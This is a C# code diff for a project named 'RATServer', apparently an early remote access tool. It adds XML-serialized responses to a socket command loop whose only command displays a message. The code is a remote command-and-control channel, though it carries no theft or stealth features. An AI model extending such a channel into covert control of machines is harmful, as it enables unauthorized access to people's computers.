@@ -7,6 +7,7 @@ using System.Linq;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
+using System.Xml;
 using System.Xml.Serialization;
 
 namespace RATServer
@@ -47,6 +48,18 @@ namespace RATServer
             }
             return z;
         }
+        static string SerializeToXml<T>(T obj)
+        {
+            XmlSerializer x = new XmlSerializer(typeof(T));
+            using (var z = new StringWriter())
+            {
+                using (XmlTextWriter w = new XmlTextWriter(z) { Formatting = Formatting.Indented })
+                {
+                    x.Serialize(w, obj);
+                    return z.ToString();
+                }
+            }
+        }
         static void Check()
         {
             if (sock.Connected)
@@ -64,14 +77,18 @@ namespace RATServer
                         return;
                     }
                     Command c = DeserializeFromXml<Command>(Encoding.ASCII.GetString(message, 0, bytesRead));
+                    Response r = new Response();
                     switch (c.CMD)
                     {
                         case "message":
                             Functions.Message(c.Args[0]);
+                            r.Msg = "Message Success";
                             break;
                         default:
                             break;
-                    }
+                    }                 
+                    Byte[] sendBytes = Encoding.ASCII.GetBytes(SerializeToXml(r));
+                    nstream.Write(sendBytes, 0, sendBytes.Length);
                 }
                 catch (Exception e)
                 {
@@ -85,5 +102,11 @@ namespace RATServer
     {
         public string CMD { get; set; }
         public string[] Args { get; set; }
+    }
+    [Serializable]
+    public class Response
+    {
+        public string Msg { get; set; }
+        public byte[] Data { get; set; }
     }
 }
